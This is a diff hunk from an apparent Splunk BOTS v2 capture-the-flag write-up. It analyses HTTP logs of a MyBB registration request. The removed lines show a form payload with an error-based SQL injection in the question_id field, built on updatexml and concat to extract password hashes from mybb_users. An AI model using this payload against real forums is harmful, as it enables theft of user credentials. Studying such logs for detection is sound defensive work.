@@ -409,9 +409,7 @@ index="botsv2" source="stream:http" src_ip="45.77.65.211" uri_path="/member.php"
 ```
 
 Taking a closer look at the form_data field (many show same form_data field content) contains:
-```
-regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1
-```
+
 That payload is an error-based SQL injection attack.
 ```
 updatexml(
